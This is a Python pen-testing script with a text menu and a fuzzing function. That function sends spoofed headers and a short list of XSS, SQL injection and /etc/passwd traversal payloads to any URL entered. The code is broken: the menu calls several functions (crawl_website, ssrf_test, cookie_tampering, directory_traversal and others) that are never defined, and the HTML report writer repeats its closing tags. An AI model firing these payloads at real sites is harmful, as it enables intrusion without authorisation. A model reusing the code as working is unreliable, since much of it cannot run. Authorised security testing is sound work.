######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################


# Setup logging for advanced APT framework
import requests
import random
import string
from bs4 import BeautifulSoup
import os
from datetime import datetime

# Banner
def print_banner():
    banner = r"""

 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)


  Web Application Security Framework - Custom Pen Testing Script
    """
    print(banner)
    

# Function to log test results to a file
def log_result(test_name, result, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {test_name}: {result}\nDetails: {details}\n"
    
    with open("penetration_testing_report.txt", "a") as log_file:
        log_file.write(log_entry)

# Function to log test results to an HTML report
def log_result_html(test_name, result, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_entry = f"""
    <tr>
        <td>{timestamp}</td>
        <td>{test_name}</td>
        <td>{result}</td>
        <td>{details}</td>
    </tr>
    """
    if not os.path.exists("penetration_testing_report.html"):
        with open("penetration_testing_report.html", "w") as html_file:
            html_file.write("""
            <html>
                <head><title>Penetration Testing Report</title></head>
                <body>
                    <h1>Penetration Testing Report</h1>
                    <table border="1">
                        <tr><th>Timestamp</th><th>Test</th><th>Result</th><th>Details</th></tr>
            """)

    with open("penetration_testing_report.html", "a") as html_file:
        html_file.write(report_entry)

    with open("penetration_testing_report.html", "a") as html_file:
        html_file.write("""
                    </table>
                </body>
            </html>
            """)

# Function for Header and Parameter Manipulation Test
def header_param_manipulation(url):
    # Custom headers to manipulate
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'http://example.com',
        'X-Forwarded-For': '127.0.0.1',  # Localhost spoofing
        'X-Request-ID': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),  # Random ID
        'Authorization': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits, k=32)),  # Fake token
        'X-Injected-Header': 'InjectedHeaderValue'  # Custom header injection
    }
    
    # Manipulating URL parameters
    payloads = ["<script>alert(1)</script>", "1 OR 1=1", "../../../../etc/passwd", "admin'--", "'' OR 1=1 --"]
    for payload in payloads:
        params = {"id": payload}  # Example of manipulating a parameter
        
        # Send GET request with manipulated headers
        response = requests.get(url, headers=headers, params=params)
        result = "Success" if response.status_code == 200 else "Failed"
        log_result("Header and Parameter Manipulation", result, f"Payload: {payload} - Status: {response.status_code}")
        log_result_html("Header and Parameter Manipulation", result, f"Payload: {payload} - Status: {response.status_code}")
        print(f"[{result}] Parameter: {payload} - Status: {response.status_code}")

# Function to print the main menu
def print_main_menu():
    print("=" * 30)
    print("Advanced Web Penetration Testing Framework")
    print("=" * 30)
    print("[1] Crawl Website and Extract Forms      [2] Brute Force Test (Optional)")
    print("[3] SQL Injection Test                   [4] XSS Test")
    print("[5] SSRF Test                            [6] Cookie Tampering Test")
    print("[7] Header and Parameter Manipulation    [8] Directory Traversal Test")
    print("[9] CSRF Test                            [10] Advanced Recon (Exposed Files & Misconfigurations)")
    print("[11] Exit")
    print("=" * 30)

# Function to get user input for form selection
def get_user_input():
    try:
        return int(input("Enter your choice (1-11): "))
    except ValueError:
        print("Invalid input, please enter a number between 1 and 11.")
        return get_user_input()

# Main function to manage the user interface
def main():
    while True:
        try:
            print_main_menu()
            choice = get_user_input()
            if choice == 1:
                url = input("Enter the URL of the website: ")
                forms = crawl_website(url)
                if forms:
                    print(f"Detected {len(forms)} forms on the website.")
            elif choice == 2:
                print("Brute Force Test (Optional) - Not yet implemented.")
            elif choice == 3:
                sql_injection_sub_menu("http://example.com")  # Replace with actual URL
            elif choice == 4:
                print("XSS Test - Not yet implemented.")
            elif choice == 5:
                url = input("Enter the URL of the website for SSRF Test: ")
                ssrf_test(url)
            elif choice == 6:
                url = input("Enter the URL of the website for Cookie Tampering Test: ")
                cookie_tampering(url)
            elif choice == 7:
                url = input("Enter the URL of the website for Header and Parameter Manipulation Test: ")
                header_param_manipulation(url)
            elif choice == 8:
                url = input("Enter the URL of the website for Directory Traversal Test: ")
                directory_traversal(url)
            elif choice == 9:
                print("CSRF Test - Not yet implemented.")
            elif choice == 10:
                print("Advanced Recon - Not yet implemented.")
            elif choice == 11:
                print("Exiting the application.")
                break
            else:
                print("Invalid choice, please choose again.")
        except KeyboardInterrupt:
            print("\nOperation interrupted. Returning to the main menu...")
            continue  # Return to the main menu after interruption

if __name__ == "__main__":
    main()
